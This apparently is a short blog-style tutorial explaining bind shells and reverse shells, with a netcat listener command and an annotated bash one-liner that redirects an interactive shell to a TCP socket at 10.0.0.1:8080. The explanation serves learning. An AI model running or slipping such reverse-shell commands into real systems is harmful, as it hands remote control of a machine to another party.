---
title: Linux - reverse shell & Bind shell
date: 2020-11-01 11:11:11 -0400
categories: [Linux, Sysadmin]
tags: [Linux, Sysadmin]
math: true
image: 
---

[toc]

---

# Bind shell

Bind shell 
- attacker's machine acts as a client 
- victim's machine acts as a server opening up a communication port on the victim and waiting for the client to connect to it 
- and then attacker issue commands that will be remotely executed on the victim's machine. 

> This would be only possible if the victim's machine has a public IP and is accessible over the internet (disregarding all firewall etc. for the sake of brevity).


what if the victim's machine is NATed and hence not directly reachable ?
- attacker's machine is reachable. 
- So attacker open a server and let the victim connect to him. 
- This is what a reverse shell is. 

---

# reverse shell

Reverse Shell 
- attacker's machine (has a public IP and is reachable over the internet) acts as a server. 
- It opens a communication channel on a port and waits for incoming connections. 
- Victim's machine acts as a client and initiates a connection to the attacker's listening server. 

Open two tabs in your terminal.
1. open TCP port 8080 and wait for a connection:
2. `nc localhost -lp 8080`
3. Open an interactive shell, and redirect the IO streams to a TCP socket:
4. `bash -i >& /dev/tcp/localhost/8080 0>&1`


```bash

bash -i >& /dev/tcp/10.0.0.1/8080 0>&1

# bash -i "If the -i option is present, the shell is interactive."

# >& "redirects both, stdout and stderr to the specified target."

# (argument for >&) /dev/tcp/localhost/8080 is a TCP client connection to localhost:8080.

# 0>&1 redirect file descriptor 0 (stdin) to fd 1 (stdout), hence the opened TCP socket is used to read input.

```

.